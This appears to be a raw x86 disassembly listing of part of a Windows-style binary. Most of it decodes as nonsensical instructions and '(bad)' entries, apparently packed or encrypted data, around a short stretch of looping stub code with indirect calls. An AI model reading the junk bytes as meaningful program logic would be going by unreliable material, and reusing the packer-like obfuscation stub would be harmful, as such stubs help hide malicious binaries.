  40a9c6:	mov    bh,0x79
  40a9c8:	scas   al,BYTE PTR es:[edi]
  40a9c9:	mov    bl,0x85
  40a9cb:	and    al,0x47
  40a9cd:	call   FWORD PTR [ebx+0x515fb617]
  40a9d3:	ror    ah,0xcf
  40a9d6:	cmp    al,0xce
  40a9d8:	lds    edi,FWORD PTR [ebx-0x25]
  40a9db:	cli    
  40a9dc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a9dd:	aaa    
  40a9de:	jl     0x40a9f0
  40a9e0:	jnp    0x40aa51
  40a9e2:	sub    DWORD PTR [ebx-0x6e0e44ac],eax
  40a9e8:	inc    eax
  40a9e9:	add    al,0x17
  40a9eb:	and    eax,0x34327d14
  40a9f0:	popa   
  40a9f1:	(bad)  
  40a9f2:	and    ebp,edx
  40a9f4:	loop   0x40aa24
  40a9f6:	dec    esp
  40a9f7:	int3   
  40a9f8:	clc    
  40a9f9:	cld    
  40a9fa:	sub    DWORD PTR [ecx+0x79e848a5],0x3f673a6a
  40aa04:	sbb    DWORD PTR [edx],esi
  40aa06:	mov    al,ds:0x85527728
  40aa0b:	fcmovnu st,st(6)
  40aa0d:	test   eax,0x34c509a3
  40aa12:	pop    edx
  40aa13:	adc    al,0x4d
  40aa15:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40aa16:	retf   0x3e84
  40aa19:	or     al,0xed
  40aa1b:	xchg   DWORD PTR [ecx+ecx*8+0x29],ecx
  40aa1f:	dec    esi
  40aa20:	mov    ch,0xbe
  40aa22:	mov    al,0x20
  40aa24:	sbb    cl,BYTE PTR [esi-0x2c]
  40aa27:	std    
  40aa28:	sbb    esi,DWORD PTR [edi+0x67929d39]
  40aa2e:	cmp    dl,BYTE PTR [ebx+0x21b379f2]
  40aa34:	push   cs
  40aa35:	pop    es
  40aa36:	pop    es
  40aa37:	jmp    0xc15f9f22
  40aa3c:	test   BYTE PTR [eax+ebp*8],0xc9
  40aa40:	or     DWORD PTR [edi],0x6c
  40aa43:	mov    ds:0xafb8a639,eax
  40aa48:	ret    
  40aa49:	jns    0x40aa5f
  40aa4b:	inc    ecx
  40aa4c:	jg     0x40a9dc
  40aa4e:	rcl    DWORD PTR [ecx-0x67d94a4a],cl
  40aa54:	or     BYTE PTR [edi+0x66681345],ch
  40aa5a:	stc    
  40aa5b:	pop    es
  40aa5c:	je     0x40aace
  40aa5e:	pop    es
  40aa5f:	(bad)  
  40aa60:	aad    0x15
  40aa62:	mov    ah,0x78
  40aa64:	std    
  40aa65:	fucomi st,st(1)
  40aa67:	stc    
  40aa68:	ins    BYTE PTR es:[edi],dx
  40aa69:	adc    cl,BYTE PTR [ecx+0x14]
  40aa6c:	lds    eax,FWORD PTR [esi+0xce0994]
  40aa72:	enter  0xea43,0x48
  40aa76:	(bad)  
  40aa77:	jne    0x40aaca
  40aa79:	das    
  40aa7a:	(bad)  
  40aa7b:	mov    bl,0x3
  40aa7d:	cmp    al,0x4c
  40aa7f:	adc    esp,ebp
  40aa81:	pusha  
  40aa82:	and    BYTE PTR [edx-0x24],bl
  40aa85:	xchg   ebp,eax
  40aa86:	fisub  DWORD PTR [eax+0x2076c904]
  40aa8c:	int3   
  40aa8d:	mov    eax,ds:0xd8c5120b
  40aa92:	inc    ecx
  40aa93:	push   es
  40aa94:	cs and ebp,ecx
  40aa97:	sbb    eax,DWORD PTR [eax]
  40aa99:	lock das 
  40aa9b:	pop    esp
  40aa9c:	inc    esi
  40aa9d:	adc    edi,DWORD PTR [edx+0x593594a8]
  40aaa3:	xchg   edi,eax
  40aaa4:	icebp  
  40aaa5:	xor    eax,0xe1617bef
  40aaaa:	dec    ebp
  40aaab:	into   
  40aaac:	aas    
  40aaad:	jmp    0x2fc798c4
  40aab2:	fstp   QWORD PTR [eax]
  40aab4:	das    
  40aab5:	jmp    0x73d0:0x6e2daa6d
  40aabc:	lds    ebp,FWORD PTR [edi]
  40aabe:	leave  
  40aabf:	dec    ebp
  40aac0:	sub    DWORD PTR [esi+0x416cd1f1],esp
  40aac6:	push   ds
  40aac7:	pop    eax
  40aac8:	dec    edi
  40aac9:	inc    eax
  40aaca:	prefetch BYTE PTR [ebp-0x52b7d48d]
  40aad1:	mov    BYTE PTR [edx+0x6],cl
  40aad4:	mov    esi,0xfb9243c2
  40aad9:	dec    eax
  40aada:	pop    ss
  40aadb:	pop    edx
  40aadc:	imul   ebp,DWORD PTR [esi-0x70],0x16
  40aae0:	mov    ch,0xf7
  40aae2:	pop    edi
  40aae3:	pop    es
  40aae4:	stc    
  40aae5:	jae    0x40ab2f
  40aae7:	mov    ebp,0xad4bf251
  40aaec:	pop    ebx
  40aaed:	aad    0xe
  40aaef:	std    
  40aaf0:	adc    DWORD PTR [esi],0x5c
  40aaf3:	push   ss
  40aaf4:	pop    eax
  40aaf5:	sbb    esi,DWORD PTR [ebx+0x227972d3]
  40aafb:	stos   DWORD PTR es:[edi],eax
  40aafc:	sbb    al,0xa1
  40aafe:	dec    edi
  40aaff:	mov    edi,0x8d9d58a7
  40ab04:	ret    
  40ab05:	add    DWORD PTR [edi],ebx
  40ab07:	pop    eax
  40ab08:	mov    bl,dl
  40ab0a:	scas   eax,DWORD PTR es:[edi]
  40ab0b:	mov    edi,0x6d13d88e
  40ab10:	xchg   edi,eax
  40ab11:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ab12:	je     0x40aa9e
  40ab14:	mov    ecx,0x392cef28
  40ab19:	push   0xb3320fa0
  40ab1e:	or     edx,DWORD PTR [eax]
  40ab20:	je     0x40aaa4
  40ab22:	or     edx,DWORD PTR [esi+0x61a45b2d]
  40ab28:	jge    0x40aab5
  40ab2a:	scas   al,BYTE PTR es:[edi]
  40ab2b:	outs   dx,BYTE PTR ds:[esi]
  40ab2c:	inc    ebx
  40ab2d:	push   edi
  40ab2e:	dec    ebp
  40ab2f:	lds    edi,FWORD PTR [edi]
  40ab31:	pop    ebx
  40ab32:	add    dh,bl
  40ab34:	pop    ss
  40ab35:	rcr    DWORD PTR ds:0x2e7b6d1e,1
  40ab3b:	ins    DWORD PTR es:[edi],dx
  40ab3c:	sub    BYTE PTR [ebx-0x6edc229e],0xb8
  40ab43:	and    esp,edx
  40ab45:	push   esp
  40ab46:	into   
  40ab47:	inc    edx
  40ab48:	pusha  
  40ab49:	sub    eax,0x3e6fefd6
  40ab4e:	lahf   
  40ab4f:	push   ecx
  40ab50:	dec    edi
  40ab51:	cmp    eax,0x799ec271
  40ab57:	mov    esp,0xc4637047
  40ab5c:	fisubr WORD PTR [edi+0x7e]
  40ab5f:	(bad)  
  40ab60:	dec    edi
  40ab61:	sbb    BYTE PTR [ebx],bl
  40ab63:	jo     0x40ab04
  40ab65:	mov    bh,0x29
  40ab67:	cmp    eax,0x65e986cd
  40ab6c:	xor    DWORD PTR [esi-0x2c11ad9f],ebx
  40ab72:	pop    edx
  40ab73:	enter  0x229d,0xfc
  40ab77:	cmp    BYTE PTR [ebx],0xf8
  40ab7a:	add    edx,DWORD PTR [ebx]
  40ab7c:	addr16 nop
  40ab7e:	sti    
  40ab7f:	mov    ebx,0xa6149cbb
  40ab84:	cmp    al,0xc8
  40ab86:	xor    eax,0x5f5adba8
  40ab8b:	push   ds
  40ab8c:	fbld   TBYTE PTR [esi+0x42425bd9]
  40ab92:	test   eax,ebp
  40ab94:	sub    edi,DWORD PTR [edx]
  40ab96:	dec    ecx
  40ab97:	(bad)  
  40ab98:	repnz lods al,BYTE PTR ds:[esi]
  40ab9a:	call   0x9e86a676
  40ab9f:	dec    ecx
  40aba0:	out    0xd,al
  40aba2:	mov    esp,0x6377f82e
  40aba7:	das    
  40aba8:	dec    ecx
  40aba9:	imul   edi,ecx,0x9
  40abac:	shl    ebp,0x34
  40abaf:	or     eax,0xa2d111b
  40abb4:	dec    edx
  40abb5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40abb6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40abb7:	in     eax,0xdc
  40abb9:	fdiv   st(4),st
  40abbb:	test   al,0x11
  40abbd:	cwde   
  40abbe:	cmp    al,0xac
  40abc0:	push   eax
  40abc1:	(bad)  
  40abc3:	or     al,0x56
  40abc5:	mov    ebp,0xe69901af
  40abca:	bound  eax,QWORD PTR [ebx]
  40abcc:	inc    ecx
  40abcd:	stos   BYTE PTR es:[edi],al
  40abce:	sbb    edi,DWORD PTR [edx]
  40abd0:	bound  edx,QWORD PTR [esi+eiz*4]
  40abd3:	adc    esp,DWORD PTR ds:0xfc1a88ca
  40abd9:	push   ebx
  40abda:	in     al,dx
  40abdb:	add    eax,0xa7cf1496
  40abe0:	mov    es,WORD PTR [ecx]
  40abe2:	xchg   edx,eax
  40abe3:	lea    ebx,[esi-0x2dd534a7]
  40abe9:	in     al,0xd3
  40abeb:	loop   0x40ac04
  40abed:	push   cs
  40abee:	not    DWORD PTR [ecx-0x13aaa9b3]
  40abf4:	jo     0x40abb9
  40abf6:	scas   eax,DWORD PTR es:[edi]
  40abf7:	test   eax,eax
  40abf9:	mov    esi,0xf5f41156
  40abfe:	sbb    BYTE PTR [ecx],0x33
  40ac01:	rol    BYTE PTR [ecx+0x42fcf535],1
  40ac07:	add    BYTE PTR [edi],cl
  40ac09:	out    0x42,eax
  40ac0b:	add    BYTE PTR [ebx],al
  40ac0d:	rol    edi,1
  40ac0f:	add    eax,0x42e703
  40ac14:	fwait
  40ac15:	sbb    BYTE PTR [eax],al
  40ac17:	add    BYTE PTR [ebx],bh
  40ac19:	cli    
  40ac1a:	mov    DWORD PTR ds:0x42fcdd,0x36a4
  40ac24:	jb     0x40d88a
  40ac2a:	mov    edx,DWORD PTR [ebp-0x28]
  40ac2d:	sbb    DWORD PTR ds:0x42fd7e,ebx
  40ac33:	mov    edi,DWORD PTR [ebp-0x4]
  40ac36:	xor    edx,eax
  40ac38:	sub    DWORD PTR ds:0x42fcf5,edx
  40ac3e:	xor    edi,eax
  40ac40:	mov    DWORD PTR ds:0x42e6f7,0x1f
  40ac4a:	cmp    DWORD PTR ds:0x42e6f7,0x0
  40ac51:	je     0x40acfa
  40ac57:	cmp    DWORD PTR ds:0x42e6f7,0x2e
  40ac5e:	jne    0x40ac7d
  40ac64:	push   DWORD PTR [ebp-0xc]
  40ac67:	push   0x42e23d
  40ac6c:	push   DWORD PTR [ebp-0x24]
  40ac6f:	push   0x691a
  40ac74:	push   DWORD PTR [ebp-0x10]
  40ac77:	call   DWORD PTR ds:0x42e2f3
  40ac7d:	mov    ebx,DWORD PTR ds:0x42e6f7
  40ac83:	dec    ebx
  40ac84:	mov    DWORD PTR ds:0x42e6f7,ebx
  40ac8a:	jmp    0x40ac4a
  40ac8f:	and    DWORD PTR ds:0x42e128,0x0
  40ac99:	jmp    0x40acad
  40ac9e:	xor    ebx,ebx
  40aca0:	or     ebx,DWORD PTR ds:0x42e128
  40aca6:	inc    ebx
  40aca7:	mov    DWORD PTR ds:0x42e128,ebx
  40acad:	cmp    DWORD PTR ds:0x42e128,0x1a
  40acb4:	jae    0x40acfa
  40acba:	cmp    DWORD PTR ds:0x42e128,0xc
  40acc1:	jne    0x40acd5
  40acc7:	push   0x2dd0
  40accc:	push   DWORD PTR [ebp-0x14]
  40accf:	call   DWORD PTR ds:0x42e2f7
  40acd5:	cmp    DWORD PTR ds:0x42e128,0xb
  40acdc:	jne    0x40acef
  40ace2:	mov    ebx,DWORD PTR ds:0x42e128
  40ace8:	inc    ebx
  40ace9:	mov    DWORD PTR ds:0x42e128,ebx
  40acef:	jmp    0x40ac9e
  40acf4:	adc    ebx,0x2885
  40acfa:	add    edi,ecx
  40acfc:	sbb    ebx,0x5c75
  40ad02:	add    edx,ecx
  40ad04:	imul   edx,edi
  40ad07:	sub    ebx,DWORD PTR ds:0x42e134
  40ad0d:	mov    edi,DWORD PTR [ebp-0x8]
  40ad10:	mov    DWORD PTR ds:0x42fce1,0x13
  40ad1a:	cmp    DWORD PTR ds:0x42fce1,0x0
  40ad21:	je     0x40ad54
  40ad27:	cmp    DWORD PTR ds:0x42fce1,0x14
  40ad2e:	jne    0x40ad42
  40ad34:	push   DWORD PTR [ebp-0x28]
  40ad37:	push   0x42fd01
  40ad3c:	call   DWORD PTR ds:0x42e54b
  40ad42:	mov    ebx,DWORD PTR ds:0x42fce1
  40ad48:	dec    ebx
  40ad49:	mov    DWORD PTR ds:0x42fce1,ebx
  40ad4f:	jmp    0x40ad1a
  40ad54:	mov    ebx,DWORD PTR [ebp-0x10]
  40ad57:	sub    ebx,edi
  40ad59:	cmp    ebx,edx
  40ad5b:	ja     0x40ad6d
  40ad61:	mov    edx,DWORD PTR [ebp-0x4]
  40ad64:	xor    edx,eax
  40ad66:	add    edx,ecx
  40ad68:	jmp    0x40c0fc
  40ad6d:	mov    edx,DWORD PTR [ebp-0x2c]
  40ad70:	mov    edi,DWORD PTR [ebp-0x4]
  40ad73:	xor    edx,eax
  40ad75:	xor    edi,eax
  40ad77:	add    edi,ecx
  40ad79:	add    edx,ecx
  40ad7b:	imul   edx,edi
  40ad7e:	mov    edi,DWORD PTR [ebp-0x8]
  40ad81:	mov    ebx,DWORD PTR [ebp-0x10]
  40ad84:	sub    ebx,edi
  40ad86:	cmp    ebx,edx
  40ad88:	ja     0x40ad96
  40ad8e:	mov    edx,DWORD PTR [ebp-0x28]
  40ad91:	jmp    0x40c0ee
  40ad96:	mov    edx,DWORD PTR [ebp-0x30]
  40ad99:	mov    edi,DWORD PTR [ebp-0x4]
  40ad9c:	xor    edx,eax
  40ad9e:	xor    edi,eax
  40ada0:	add    edi,ecx
  40ada2:	jmp    0x40b160
  40ada7:	xor    BYTE PTR [eax+eiz*4],bl
  40adaa:	mov    bh,0x6c
  40adac:	mov    bl,0xc7
  40adae:	jae    0x40ae09
  40adb0:	jg     0x40ad82
  40adb2:	ja     0x40ad47
  40adb4:	xchg   esp,eax
  40adb5:	pushf  
  40adb6:	cmc    
  40adb7:	add    edi,ebp
  40adb9:	jo     0x40ae2b
  40adbb:	lahf   
  40adbc:	jge    0x40ae2e
  40adbe:	jo     0x40ad9c
  40adc0:	repz je 0x40ad91
  40adc3:	gs leave 
  40adc5:	idiv   BYTE PTR [ecx-0x13]
  40adc8:	sbb    dl,ah
  40adca:	mov    BYTE PTR [eax-0x5314066f],ah
  40add0:	retf   
  40add1:	pop    ebx
  40add2:	iret   
  40add3:	pop    ss
  40add4:	cmp    eax,0xefaddcaf
  40add9:	(bad)  
  40adda:	sbb    bh,0xfe
  40addd:	xor    BYTE PTR [ebp-0x53],0x89
  40ade1:	loop   0x40ae43
  40ade3:	pop    ss
  40ade4:	mov    cl,0x78
  40ade6:	push   ecx
  40ade7:	addr16 mov ch,0x46
  40adea:	loope  0x40ad83
  40adec:	sub    ch,bl
  40adee:	sbb    al,0xbd
  40adf0:	jp     0x40ad76
  40adf2:	and    eax,0x260f036c
  40adf7:	sbb    BYTE PTR [ecx],ch
  40adf9:	inc    ebp
  40adfa:	aas    
  40adfb:	outs   dx,DWORD PTR ds:[esi]
  40adfc:	xchg   edx,eax
  40adfd:	rcr    DWORD PTR fs:[edx+eiz*8+0x53],cl
  40ae02:	push   ebx
  40ae03:	inc    edx
  40ae04:	sbb    BYTE PTR [edi+0x7],dh
  40ae07:	inc    esi
  40ae08:	ja     0x40ada5
  40ae0a:	mov    ss,WORD PTR [ecx+0x1dd6bd85]
  40ae10:	int3   
  40ae11:	or     dl,BYTE PTR ds:0x71ffc95b
  40ae17:	jmp    0x658d09c4
  40ae1c:	adc    al,0x20
  40ae1e:	iret   
  40ae1f:	arpl   dx,dx
  40ae21:	xor    eax,0x6ace3117
  40ae26:	hlt    
  40ae27:	push   es
  40ae28:	fidivr WORD PTR [edx-0xd9739df]
  40ae2e:	inc    edx
  40ae2f:	addr16 pop ebp
  40ae31:	and    al,0x9
  40ae33:	dec    edx
  40ae34:	inc    edi
  40ae35:	(bad)  
  40ae36:	sub    edx,DWORD PTR [ecx+0x34af1b41]
  40ae3c:	fwait
  40ae3d:	cli    
  40ae3e:	daa    
  40ae3f:	repnz das 
  40ae41:	or     eax,0x7d74aac9
  40ae46:	ds retf 
  40ae48:	xor    al,0x33
  40ae4a:	cmp    al,0xcc
  40ae4c:	jo     0x40ae62
  40ae4e:	retf   0x45bb
  40ae51:	pop    edi
  40ae52:	aaa    
  40ae53:	int    0xcd
  40ae55:	mov    edi,0x991e0088
  40ae5a:	repnz pushf 
  40ae5c:	xchg   esi,ecx
  40ae5e:	aam    0x9d
  40ae60:	sbb    al,0xc8
  40ae62:	aad    0xb9
  40ae64:	test   eax,0xca1b00a5
  40ae69:	fimul  DWORD PTR [esi+0x45e46719]
  40ae6f:	dec    esi
  40ae70:	xor    ebp,esi
  40ae72:	dec    eax
  40ae73:	std    
  40ae74:	mov    eax,DWORD PTR [eax-0x35ea3734]
  40ae7a:	js     0x40ae79
  40ae7c:	(bad)  
  40ae7e:	sub    dh,dh
  40ae80:	add    dh,BYTE PTR [bp+di-0x623e]
  40ae85:	iret   
  40ae86:	enter  0x7f47,0xa6
  40ae8a:	std    
  40ae8b:	into   
  40ae8c:	xor    BYTE PTR [ebp-0x6c81874d],bl
  40ae92:	xor    DWORD PTR [ecx-0x3f45ed36],esp
  40ae98:	dec    esi
  40ae9a:	inc    edx
  40ae9b:	outs   dx,BYTE PTR ds:[esi]
  40ae9c:	mov    dh,ah
  40ae9e:	cdq    
  40ae9f:	mov    ch,0x7c
  40aea1:	retf   
  40aea2:	out    dx,eax
  40aea3:	(bad)  [edx-0x72c86a1b]
  40aea9:	daa    
  40aeaa:	fsub   DWORD PTR [edx+ebp*8-0x38]
  40aeae:	mov    ss,WORD PTR [esi]
  40aeb0:	xor    ecx,DWORD PTR [ebp-0x2db7cec1]
  40aeb6:	loop   0x40ae8b
  40aeb8:	pop    eax
  40aeb9:	call   DWORD PTR [ebp-0x24]
  40aebc:	mov    WORD PTR [edi-0x78321b2b],?
  40aec2:	outs   dx,DWORD PTR ds:[esi]
  40aec3:	jns    0x40aee3
  40aec5:	inc    edi
  40aec6:	sbb    eax,0xc804121e
  40aecb:	mov    dh,0xb5
  40aecd:	imul   ecx,DWORD PTR ds:0x70ffc5b2,0x22611c9d
  40aed7:	dec    edx
  40aed8:	and    eax,0x8bcb59b1
  40aedd:	pusha  
  40aede:	(bad)  
  40aedf:	mov    al,0x98
  40aee1:	mov    bh,0x57
  40aee3:	or     cl,0x73
  40aee6:	push   edi
  40aee7:	jl     0x40af28
  40aee9:	push   edi
  40aeea:	jg     0x40ae8f
  40aeec:	fisubr DWORD PTR [esi-0x1f]
  40aeef:	jbe    0x40aecb
  40aef1:	cmp    bh,BYTE PTR [edx]
  40aef3:	cmp    DWORD PTR [esi-0x48dc187a],esp
  40aef9:	ja     0x40af20
  40aefb:	pop    es
  40aefc:	jg     0x40af29
  40aefe:	lock jl 0x40ae9d
  40af01:	push   ss
  40af02:	bound  edx,QWORD PTR ds:0x83cbc0d3
  40af08:	test   DWORD PTR [esi+0xc],ecx
  40af0b:	push   ecx
  40af0c:	fisttp DWORD PTR ds:0x97761627
  40af12:	push   es
  40af13:	mov    esi,0xec8ea3bf
  40af18:	mov    cl,0x6b
  40af1a:	nop
  40af1b:	sbb    ah,BYTE PTR [edi+0x562e30ca]
  40af21:	push   ecx
  40af22:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40af23:	or     esi,DWORD PTR [edx-0x4e]
  40af26:	dec    ebx
  40af27:	jne    0x40aeac
  40af29:	dec    ecx
  40af2a:	inc    ebp
  40af2b:	rep ds stos DWORD PTR es:[edi],eax
  40af2e:	sub    bh,BYTE PTR [eax+0x328c0580]
  40af34:	loop   0x40af8b
  40af36:	xor    al,0x51
  40af38:	inc    esp
  40af39:	mov    bl,BYTE PTR [edi+0x4b0dfa09]
  40af3f:	xchg   esp,eax
  40af40:	aaa    
  40af41:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40af42:	mov    bh,0xdc
  40af44:	jae    0x40af0a
  40af46:	aad    0x9e
  40af48:	and    edx,DWORD PTR [eax+0x24]
  40af4b:	mov    ebp,0xb405e660
  40af50:	imul   esi,DWORD PTR [ebx-0x1e632a9],0x41
  40af57:	loop   0x40af74
  40af59:	sub    al,0x30
  40af5b:	lods   eax,DWORD PTR ds:[esi]
  40af5c:	sub    eax,0x37679a69
  40af61:	std    
  40af62:	inc    eax
  40af63:	jmp    0x508d:0xe05ff1c
  40af6a:	push   eax
  40af6b:	jnp    0xf5b266ed
  40af71:	inc    ebp
  40af72:	not    BYTE PTR [esi+0x5c75ad56]
  40af78:	sbb    ecx,esp
  40af7a:	dec    ebx
  40af7b:	jno    0x40af2b
  40af7d:	inc    eax
  40af7e:	mov    cl,0xfe
  40af80:	adc    bh,dh
  40af82:	lahf   
  40af83:	ret    0xccd1
  40af86:	fisubr DWORD PTR [ebp+edx*8+0x66]
  40af8a:	dec    ebp
  40af8b:	cmp    eax,0x5a4c0c7f
  40af90:	shl    ebp,0xce
  40af93:	push   ecx
  40af94:	pop    edi
  40af95:	xchg   ecx,eax
  40af96:	mov    ds:0x746f12c7,eax
  40af9b:	arpl   WORD PTR [edx+edx*2-0x2314e529],di
  40afa2:	and    BYTE PTR [ecx],cl
  40afa4:	sbb    edi,DWORD PTR ds:0xb266fd2d
  40afaa:	aad    0x9b
  40afac:	cli    
  40afad:	adc    eax,DWORD PTR [edi]
  40afaf:	add    BYTE PTR [edi+0x24bec4c2],ch
  40afb5:	sar    DWORD PTR [ebx+0x66],1
  40afb8:	leave  
  40afb9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40afba:	inc    eax
  40afbb:	add    ebx,DWORD PTR [ecx-0x5a9f23e3]
  40afc1:	cmp    al,0x62
  40afc3:	add    al,0x60
  40afc5:	dec    ecx
  40afc6:	inc    esp
  40afc7:	mov    edi,0x412ad2b2
  40afcd:	push   eax
  40afce:	xlat   BYTE PTR ds:[ebx]
  40afcf:	jecxz  0x40b00c
  40afd1:	dec    ecx
  40afd2:	ja     0x40afd2
  40afd4:	push   ebx
  40afd5:	(bad)  
  40afd7:	fldenv [edi]
  40afd9:	imul   edx,DWORD PTR [edi],0xf5f8a03
  40afdf:	mov    al,ds:0xf8811d11
  40afe4:	inc    ebx
  40afe5:	sbb    esi,DWORD PTR [ebp+0x409e5ff]
  40afeb:	(bad)  
  40afec:	sbb    ch,BYTE PTR [ebx-0x36]
  40afef:	cmp    dl,BYTE PTR ds:0x69a0894e
  40aff5:	push   cs
  40aff6:	mov    bl,0xe5
  40aff8:	xor    dh,bl
  40affa:	pop    esp
  40affb:	icebp  
  40affc:	ins    BYTE PTR es:[edi],dx
  40affd:	loopne 0x40afe7
  40afff:	mov    ebx,0x300aad86
  40b004:	in     al,dx
  40b005:	dec    edx
  40b006:	push   esp
  40b007:	test   BYTE PTR [ecx+0x1e19b778],0x5e
  40b00e:	fcomip st,st(3)
  40b010:	or     BYTE PTR [edi],ah
  40b012:	call   0xf95c:0x3b9dc241
  40b019:	inc    ecx
  40b01a:	jecxz  0x40afab
  40b01c:	push   edx
  40b01d:	and    DWORD PTR [ebx],esi
  40b01f:	lods   eax,DWORD PTR ds:[esi]
  40b020:	int3   
  40b021:	ds mov cl,0xf9
  40b024:	inc    ecx
  40b025:	cli    
  40b026:	push   0x2d
  40b028:	mov    cl,0x17
  40b02a:	xor    edi,DWORD PTR [edi]
  40b02c:	pop    ss
  40b02d:	and    ecx,DWORD PTR [edx]
  40b02f:	and    BYTE PTR [ecx],0xde
  40b032:	lahf   
  40b033:	nop
  40b034:	sti    
  40b035:	xor    BYTE PTR [eax+0x7c],0x67
  40b039:	sbb    DWORD PTR [eax+0x33ba10d9],ebx
  40b03f:	popa   
  40b040:	repz mov bl,dh
  40b043:	in     eax,0x5e
  40b045:	and    ebp,DWORD PTR [eax+0xe]
  40b048:	mov    eax,DWORD PTR [ebp-0x66]
  40b04b:	inc    esi
  40b04c:	hlt    
  40b04d:	not    DWORD PTR [eax-0x1bdbd014]
  40b053:	or     DWORD PTR [ebp+0x1da2e4c2],0x33
  40b05a:	pop    eax
  40b05b:	mov    ebp,0x1910595c
  40b060:	shr    DWORD PTR [edx+0x37dddbb0],0x7d
  40b067:	leave  
  40b068:	sub    al,0x99
  40b06a:	and    ecx,DWORD PTR [esi-0x3f]
  40b06d:	test   al,0x3d
  40b06f:	xchg   ecx,eax
  40b070:	xchg   esi,eax
  40b071:	pop    ecx
  40b072:	xchg   DWORD PTR [edx-0xb],esi
  40b075:	fxch   st(6)
  40b077:	sbb    BYTE PTR [ebx+eiz*1-0x92c9b62],dl
  40b07e:	aas    
  40b07f:	loop   0x40b089
  40b081:	neg    BYTE PTR [esi+edi*2-0x20d14ecb]
  40b088:	pop    ds
  40b089:	les    esi,FWORD PTR [edx+0x3c]
  40b08c:	jle    0x40b03a
  40b08e:	arpl   dx,ax
  40b090:	xlat   BYTE PTR ds:[ebx]
  40b091:	cmp    ch,cl
  40b093:	pop    esp
  40b094:	xor    BYTE PTR [ecx],dl
  40b096:	and    ebp,ebp
  40b098:	dec    esi
  40b099:	push   es
  40b09a:	pop    es
  40b09b:	test   DWORD PTR [ebx-0x42379dfe],esi
  40b0a1:	jbe    0x40b04a
  40b0a3:	xor    al,0x9
  40b0a5:	pop    ebp
  40b0a6:	sbb    al,0x4a
  40b0a8:	inc    eax
  40b0a9:	shl    esi,1
  40b0ab:	stos   BYTE PTR es:[edi],al
  40b0ac:	cmp    BYTE PTR [ecx],ch
  40b0ae:	xor    esp,DWORD PTR [ebp+0x40f423ab]
  40b0b4:	jae    0x40b03c
  40b0b6:	ins    BYTE PTR es:[edi],dx
  40b0b7:	in     al,0x15
  40b0b9:	cmp    al,0x7
  40b0bb:	jbe    0x40b0d2
  40b0bd:	inc    eax
  40b0be:	les    edi,FWORD PTR ds:0xf8dca70f
  40b0c4:	sar    DWORD PTR [eax],1
  40b0c6:	cmp    DWORD PTR [ecx],ebx
  40b0c8:	loope  0x40b094
  40b0ca:	pop    esi
  40b0cb:	fidivr WORD PTR [ecx-0x41b33fe2]
  40b0d1:	push   esi
  40b0d2:	cmp    al,0xf1
  40b0d4:	in     al,0x57
  40b0d6:	lock setge BYTE PTR [eax]
  40b0da:	sub    eax,0xbeedcff9
  40b0df:	scas   eax,DWORD PTR es:[edi]
  40b0e0:	pop    edx
  40b0e1:	and    al,0xb7
  40b0e3:	mov    gs,WORD PTR [ebx+0xa]
  40b0e6:	stc    
  40b0e7:	mov    DWORD PTR [ecx],ebx
  40b0e9:	(bad)  
  40b0ea:	leave  
  40b0eb:	nop
  40b0ec:	sub    al,0xf6
  40b0ee:	push   ss
  40b0ef:	xchg   BYTE PTR [edx-0x16],al
  40b0f2:	xor    esp,ecx
  40b0f4:	mov    ebp,0x71050e1f
  40b0f9:	mov    ecx,0xd197d86a
  40b0fe:	data16 stc 
  40b100:	fnstenv [edx]
  40b102:	sbb    al,BYTE PTR [esi-0x42]
  40b105:	repz inc ebp
  40b107:	nop
  40b108:	stos   DWORD PTR es:[edi],eax
  40b109:	sbb    al,0x9
  40b10b:	adc    BYTE PTR [edi+0x5cc064c5],bh
  40b111:	ins    BYTE PTR es:[edi],dx
  40b112:	xor    ch,cl
  40b114:	and    eax,0xb2a3d6e5
  40b119:	fwait
  40b11a:	aad    0x57
  40b11c:	inc    esp
  40b11d:	int    0x3e
  40b11f:	inc    edi
  40b120:	xchg   esp,eax
  40b121:	retf   0xc77
  40b124:	(bad)  
  40b125:	lock retf 
  40b127:	xchg   DWORD PTR [edx-0x9d441e6],ecx
  40b12d:	ds pop ss
  40b12f:	inc    esp
  40b130:	adc    cl,BYTE PTR [ebp+0x48]
  40b133:	cmp    BYTE PTR [eax-0x4432df3],ah
  40b139:	bound  edi,QWORD PTR [ebx+ebx*1-0x2f]
  40b13d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b13e:	add    eax,0x2d928388
  40b143:	inc    edi
  40b144:	cdq    
  40b145:	cmp    BYTE PTR [ebx],ah
  40b147:	jnp    0x40b0cd
  40b149:	adc    ah,BYTE PTR [ecx-0x3207a705]
  40b14f:	out    dx,eax
  40b150:	cmp    eax,DWORD PTR [edi+0x51b70f36]
  40b156:	out    dx,eax
  40b157:	push   edx
  40b158:	loope  0x40b133
  40b15a:	in     al,0x13
  40b15c:	mov    esp,0x301330c
  40b161:	shr    ecx,1
  40b163:	mov    ecx,0xd2000003
  40b168:	jne    0x40b1a1
  40b16a:	sub    esi,DWORD PTR [ebx-0x188a2d97]
  40b170:	retf   0xa792
  40b173:	mov    ebx,0xa2dcf6ef
  40b178:	cli    
  40b179:	jo     0x40b1eb
  40b17b:	lahf   
  40b17c:	jge    0x40b1ee
  40b17e:	jo     0x40b121
  40b180:	js     0x40b19c
  40b182:	or     dh,bh
  40b184:	fidiv  WORD PTR [ebp-0x3f9414f3]
  40b18a:	ret    
  40b18b:	inc    edx
  40b18c:	push   0xffffff91
  40b18e:	lods   eax,DWORD PTR ds:[esi]
  40b18f:	inc    eax
  40b190:	push   ebx
  40b191:	inc    ebx
  40b192:	push   es
  40b193:	xchg   esi,eax
  40b194:	aam    0xa3
  40b196:	fisttp QWORD PTR [ebx]
  40b198:	and    BYTE PTR [edi+0x728e6ba9],al
  40b19e:	pop    esp
  40b19f:	fisub  WORD PTR cs:[ebp-0x691ea1dd]
  40b1a6:	std    
  40b1a7:	iret   
  40b1a8:	(bad)  
  40b1a9:	lods   eax,DWORD PTR ds:[esi]
  40b1aa:	(bad)  
  40b1ac:	stc    
  40b1ad:	pop    es
  40b1ae:	inc    esi
  40b1af:	dec    esp
  40b1b0:	in     eax,dx
